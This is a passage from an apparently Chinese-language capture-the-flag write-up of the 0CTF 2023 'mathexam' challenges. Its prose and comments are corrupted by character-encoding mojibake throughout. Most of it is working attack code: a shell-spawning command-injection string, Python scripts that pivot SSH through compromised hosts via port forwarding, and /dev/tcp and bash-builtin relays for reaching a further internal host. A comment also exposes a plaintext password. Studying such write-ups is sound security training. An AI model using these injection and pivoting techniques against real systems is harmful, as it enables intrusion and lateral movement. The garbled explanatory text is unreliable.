<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦åˆ©ç”¨ busyboxã€bashã€cat æ¥åšç«¯å£è½¬å‘ï¼Œå…·ä½“æ€è·¯å¦‚ä¸‹ï¼š</p>
<ol>
  <li>é€šè¿‡ busybox nc è¿æ¥åˆ° secondã€‚æ­¤æ—¶ busybox nc ä¸ ssh æœåŠ¡å»ºç«‹èµ·äº† TCP è¿æ¥ã€‚
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>busybox nc second 22
</code></pre></div>    </div>
  </li>
  <li>æˆ‘ä»¬åªéœ€è¦åœ¨è¯¥è¿æ¥ä¸­æ”¶å‘æ•°æ®å³å¯å®Œæˆ ssh è®¤è¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ python ä¸­çš„ subprocess æ¨¡å—æ¥æ§åˆ¶ç»ˆç«¯æ•°æ®çš„æ”¶å‘ï¼Œä»¥æ­¤æ¥å®ç°ç«¯å£è½¬å‘ã€‚</li>
</ol>

<p>ç¼–å†™è„šæœ¬å¦‚ä¸‹ã€‚</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">select</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">time</span>
<span class="c1"># å‘½ä»¤å’Œå‚æ•°
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">nc</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-X</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">connect</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-x</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">instance.0ctf2023.ctf.0ops.sjtu.cn:18081</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">kctgxr4bjb6kgj26</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">]</span>

<span class="c1"># å¯åŠ¨è¿›ç¨‹
</span><span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span>
    <span class="n">command</span><span class="p">,</span> 
    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
    <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span>  <span class="c1"># è®¾ç½®ä¸º 0 ä»¥å…³é—­ç¼“å†²
</span><span class="p">)</span>

<span class="n">thread_close</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">read_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">thread_close</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="c1"># æ£€æŸ¥æ˜¯å¦æœ‰æ•°æ®å¯è¯»
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">reads</span><span class="p">:</span>
            <span class="c1"># è·å–æ–‡ä»¶æè¿°ç¬¦
</span>            <span class="n">fd</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">fileno</span><span class="p">()</span>
            <span class="c1"># è¯»å–å¯ç”¨çš„æ•°æ®
</span>            <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>  <span class="c1"># è¯»å–æœ€å¤š 4096 å­—èŠ‚
</span>            <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="nf">decode</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>

<span class="c1"># åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹
</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="c1"># å‘é€å‘½ä»¤
</span><span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">x[$(/bin/busybox sh 1&gt;&amp;2)] </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">busybox ping -c 1 second</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>

<span class="c1">#ç›‘å¬ç«¯å£ï¼Œå»ºç«‹é€šé“
</span><span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># è®¾ç½®ç›‘å¬ç«¯å£
</span><span class="n">listen_port</span> <span class="o">=</span> <span class="mi">3333</span>

<span class="c1"># åˆ›å»º socket å¯¹è±¡
</span><span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">listen_port</span><span class="p">))</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Listening on port </span><span class="si">{</span><span class="n">listen_port</span><span class="si">}</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># æ¥å—ä¸€ä¸ªè¿æ¥
</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server_socket</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Connection from </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s"> established.</span><span class="sh">"</span><span class="p">)</span>
<span class="n">thread_close</span><span class="o">=</span><span class="mi">1</span>
<span class="c1"># ç­‰å¾…çº¿ç¨‹ç»“æŸ
</span><span class="n">thread</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">busybox nc second 22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">socket_read_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="c1"># æ£€æŸ¥ process.stdout æ˜¯å¦æœ‰æ•°æ®å¯è¯»
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">client_socket</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="c1"># å¦‚æœ process.stdout æœ‰æ•°æ®å¯è¯»ï¼Œåˆ™å°†æ•°æ®å‘é€åˆ°å®¢æˆ·ç«¯
</span>        <span class="k">if</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span> <span class="ow">in</span> <span class="n">reads</span><span class="p">:</span>
            <span class="n">fd</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">fileno</span><span class="p">()</span>
            <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
                <span class="n">client_socket</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">socket_write_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="c1"># ä½¿ç”¨ select ç›‘æµ‹å®¢æˆ·ç«¯ socket æ˜¯å¦æœ‰æ•°æ®å¯è¯»
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">client_socket</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="c1"># å¦‚æœå®¢æˆ·ç«¯æœ‰æ•°æ®å¯è¯»ï¼Œåˆ™å°†æ•°æ®å‘é€åˆ° process.stdin
</span>        <span class="k">if</span> <span class="n">client_socket</span> <span class="ow">in</span> <span class="n">reads</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">client_socket</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>


<span class="n">thread1</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">socket_read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread1</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
<span class="n">thread2</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">socket_write_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread2</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="n">thread1</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
<span class="n">thread2</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

<span class="n">client_socket</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Connection closed.</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>
<p>æ‰§è¡Œè¯¥è„šæœ¬åï¼Œä¼šå°†æœ¬åœ°çš„ 3333 ç«¯å£è½¬å‘åˆ° second çš„ 22 ç«¯å£ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿æ¥åˆ° second äº†ã€‚</p>
<h2 id="mathexam-3">mathexam-3</h2>
<p>è¿æ¥åˆ° second åï¼Œflag æ–‡ä»¶ä¸­ä¼šæç¤ºç¬¬ä¸‰å…³çš„ flag åœ¨ third ä¸»æœºä¸Šï¼Œç”¨æˆ·åå¯†ç ä¸å˜ï¼Œæˆ‘ä»¬éœ€è¦å†æ„å»ºä¸€å±‚ä»£ç†ã€‚ä¸åŒåœ¨ä¸ second ä¸»æœºä¸­å°† busybox ç§»é™¤äº†ã€‚</p>

<p>æ²¡æœ‰ nc çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨ exec æˆ–è€… cat è¿æ¥åˆ°è¿œç¨‹ç«¯å£ï¼Œå‚è€ƒï¼š</p>
<ul>
  <li><a href="https://andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/">Some useful tips about /dev/tcp | Andrea Fortuna</a>
æ¯”å¦‚ï¼š
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> &lt;/dev/tcp/time.nist.gov/13
</code></pre></div>    </div>
    <p>æˆ–è€…ä½¿ç”¨ exec å°† tcp è¿æ¥ç»‘å®šåˆ°æè¿°ç¬¦ 3,ç„¶åé€šè¿‡ echo æˆ–è€… cat æ”¶å‘æ•°æ®ã€‚</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/www.google.com/80
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s2">host: http://www.google.com</span><span class="se">\r\n</span><span class="s2">Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span> <span class="o">&gt;</span>&amp;3
<span class="nb">cat</span> &lt;&amp;3
</code></pre></div>    </div>
    <p>æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„å»ºå‡ºä¸€ä¸ªç±»ä¼¼çš„æ”¶å‘çª—å£ï¼š</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/third/22   
<span class="nb">cat</span> &lt;&amp;3 &amp;
<span class="nb">cat</span> <span class="o">&gt;</span>&amp;3
</code></pre></div>    </div>
  </li>
</ul>

<ol>
  <li>å‰ä¸¤è¡Œä»£ç å¯ä»¥æ›¿ä»£ <code class="language-plaintext highlighter-rouge">busybox nc third 22</code>ï¼Œåˆ©ç”¨ &amp; å¯ä»¥å°†è¯»å–è¿œç¨‹æ¶ˆæ¯çš„ä»»åŠ¡æ”¾åœ¨åå°ï¼Œä¸€æ—¦æ¥æ”¶åˆ°æ•°æ®ï¼Œå°±å¯ä»¥ç›´æ¥æ‰“å°åœ¨æ ‡å‡†è¾“å‡ºä¸­ã€‚</li>
  <li>cat &gt;&amp;3 ä¼šç­‰å¾…ç”¨æˆ·çš„è¾“å…¥ï¼Œç”¨æˆ·è¾“å…¥ä¹‹åä¼šé‡å®šå‘åˆ°æè¿°ç¬¦ 3 ä¸­ï¼Œpython è„šæœ¬ä¸­å°±å¯ä»¥ç›´æ¥ç”¨ process.stdin.write å‘æ•°æ®å°±å¯ä»¥äº†ã€‚</li>
</ol>

<p>åˆ©ç”¨è„šæœ¬ä¸ä¸Šä¸€å…³çš„ç±»ä¼¼ï¼Œåœ¨æ­¤å‰çš„è„šæœ¬ä¸­åšä¿®æ”¹å³å¯ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯éœ€è¦åœ¨æ”¶å‘å‰ï¼Œå…ˆæ‰§è¡Œä¸Šé¢æ„é€ çš„ payloadã€‚</p>

<p>exp2.py</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">select</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">time</span>
<span class="kn">import</span> <span class="n">binascii</span>

<span class="c1"># å‘½ä»¤å’Œå‚æ•°
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">ssh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ctf@127.0.0.1</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-p</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">3333</span><span class="sh">"</span><span class="p">]</span>

<span class="bp">...</span>

<span class="c1"># åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹
</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#æ‰‹åŠ¨è¾“å…¥å¯†ç  x5kdkwjr8exi2bf70y8g80bggd2nuepf
</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">whoami</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>

<span class="bp">...</span>

<span class="n">listen_port</span> <span class="o">=</span> <span class="mi">4444</span>

<span class="bp">...</span>

<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">exec 3&lt;&gt;/dev/tcp/third/22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">cat &lt;&amp;3 &amp; </span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">cat &gt;&amp;3</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="bp">...</span>

</code></pre></div></div>
<p>åˆ©ç”¨æ—¶å…ˆè¿è¡Œ exp.pyï¼Œç„¶åè¿è¡Œ exp2.pyã€‚æ­¤æ—¶å¯ä»¥é€šè¿‡æœ¬åœ° 4444 ç«¯å£ç™»é™† thirdã€‚</p>

<h2 id="mathexam-4">mathexam-4</h2>
<p>è¿›å…¥äº† third ä¸»æœºåå¯ä»¥å‘ç°è¿™ä¸€å…³å°† cat ä¹Ÿå»æ‰äº†ï¼Œæ‰€ä»¥æ€è·¯ä¹Ÿæ¯”è¾ƒæ˜ç¡®ï¼Œå°±æ˜¯ä½¿ç”¨çº¯ç²¹çš„ bash å†…ç½®å‘½ä»¤æ¥è¾¾åˆ° cat ç›¸åŒçš„æ•ˆæœã€‚</p>

<p>bash ç›¸å…³å‘½ä»¤çš„ä½¿ç”¨å¯ä»¥å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://bash.cyberciti.biz/guide/Main_Page">Linux Bash Shell Scripting Tutorial Wiki</a></li>
</ul>

<p>å…¶ä¸­å°±æåˆ°äº†ä¸€äº›è¯»å†™æ–‡ä»¶æè¿°ç¬¦çš„æ–¹æ³•ï¼šreadã€echoã€printfã€‚æ¯”å¦‚æ–‡ä»¶å†™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ echo -ne æ¥å†™äºŒè¿›åˆ¶æ•°æ®ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> <span class="o">&gt;</span>&amp;3
</code></pre></div></div>
<p>è¿™æ ·å°±å¯ä»¥æ›¿ä»£ cat æ¥å†™æ•°æ®ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&gt;</span>&amp;3
</code></pre></div></div>

<p>è¯»å–æ•°æ®å¯ä»¥ä½¿ç”¨ read æ¥ä»£æ›¿ï¼Œread å¯ä»¥ä½¿ç”¨ -u å‚æ•°æŒ‡å®šæ–‡ä»¶æè¿°ç¬¦ï¼Œé€è¡Œè·å–å†…å®¹åä½¿ç”¨ echo è¾“å‡ºåˆ°ç»ˆç«¯ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read</span> <span class="nt">-u</span> 3 <span class="nt">-r</span> line<span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span><span class="k">done</span>
</code></pre></div></div>
<p>ä½†æµ‹è¯•çš„æ—¶å€™ä¼šå‘ç°ç»è¿‡ read å¤„ç†çš„æ•°æ®å‘ç”Ÿäº†å˜åŒ–ï¼Œæ‰€æœ‰çš„ \x00 éƒ½è¢«åæ‰äº†ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"1123</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">80"</span> | xxd

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"1123</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">80"</span> | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> line<span class="p">;</span>
<span class="k">do 
</span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="se">\n</span><span class="s2">"</span> <span class="p">;</span>
<span class="k">done</span> | xxd
</code></pre></div></div>
<p>read è¯»å–åˆ° \x00 æ—¶ï¼Œå¹¶ä¸ä¼šç»™å˜é‡ line èµ‹å€¼ \x00ï¼Œè€Œæ˜¯èµ‹å€¼ â€˜â€˜ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€å­—èŠ‚è¯»å–ï¼Œå¦‚æœä¸ºç©ºçš„è¯ï¼Œå°±ä¸»åŠ¨æ·»åŠ ä¸€ä¸ª \x00ï¼ŒåŒæ—¶ç»™ read æ·»åŠ  -n å’Œ -d å‚æ•°ã€‚ä¸¤è€…ä¸€èµ·ä½¿ç”¨å¯ä»¥è¾¾åˆ°é€å­—èŠ‚è¯»å–çš„ç›®çš„ã€‚</p>
<ul>
  <li>-n å‚æ•°æŒ‡å®šä¸€æ¬¡è¯»å–çš„å­—èŠ‚æ•°ã€‚</li>
  <li>-d å‚æ•°å¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦ä¸ºç©ºå­—ç¬¦ã€‚
```bash
#!/bin/bash
echo -en â€œ1123\x80\x00\x00\x00\x01\x80â€ | xxd</li>
</ul>

<p>echo -en â€œ1123\x80\x00\x00\x00\x01\x80â€ | while read -r -d â€˜â€™ -n 1 line;
do 
if [[ $line == â€˜â€™ ]] then
    echo -ne â€œ\x00â€
else
    echo -ne â€œ$lineâ€
fi
done | xxd</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>![20231211054258](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211054258.png)

å½“ç„¶,è¿™é‡Œè¾“å‡ºä¹Ÿå¯ä»¥ä½¿ç”¨ printf. printf å‚æ•° %c å¯ä»¥è¾“å‡ºå•ä¸ªå­—èŠ‚.

```bash
echo -en "1123\x80\x00\x00\x00\x01\x80" | xxd

echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line;
do 
if [[ $line == '' ]] then
    echo -ne "\x00"
else
    echo -ne "$line"
fi
done | xxd

echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line;
do 
    printf "%c" "$line"
done | xxd
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211074223.png" alt="20231211074223" /></p>

<p>è²Œä¼¼ä¸€æ ·äº†ï¼Œä½†æ˜¯å¦‚æœç”¨äºŒè¿›åˆ¶æ–‡ä»¶æµ‹è¯•çš„è¯ï¼Œè¿˜æ˜¯ä¼šå‘ç°ç»“æœä¸åŒï¼Œå¦‚ä¸‹ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">cat</span> /bin/cat | xxd <span class="o">&gt;</span> result_cat

<span class="nb">cat</span> /bin/cat | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
if</span> <span class="o">[[</span> <span class="nv">$line</span> <span class="o">==</span> <span class="s1">''</span> <span class="o">]]</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">fi
done</span> | xxd <span class="o">&gt;</span> result_echo

<span class="nb">cat</span> /bin/cat | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
    </span><span class="nb">printf</span> <span class="s2">"%c"</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">done</span> | xxd <span class="o">&gt;</span> result_printf
</code></pre></div></div>
<p>ä¾‹å¦‚ \x20 ç»è¿‡ read ä¹‹åä¹Ÿä¼šå˜æˆ â€˜â€˜ã€‚è¿™æ˜¯ç”±äº \x20 ä¸ºç©ºæ ¼ï¼Œå±äº bash ä¸­çš„åˆ†éš”ç¬¦ï¼ˆIFSï¼‰ï¼Œå› æ­¤ç»è¿‡ read ä¹‹åä¹Ÿä¼šå˜æˆ â€˜â€˜ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒIFS çš„å€¼åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ã€‚</p>

<p>ä½† read å¯ä»¥æŒ‡å®š IFS çš„å€¼ã€‚IFS= å¯ä»¥å°†åˆ†éš”ç¬¦è®¾ç½®ä¸º â€˜â€˜ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">cat</span> /bin/cat | xxd <span class="o">&gt;</span> result_cat

<span class="nb">cat</span> /bin/cat | <span class="k">while </span><span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
if</span> <span class="o">[[</span> <span class="nv">$line</span> <span class="o">==</span> <span class="s1">''</span> <span class="o">]]</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="k">else
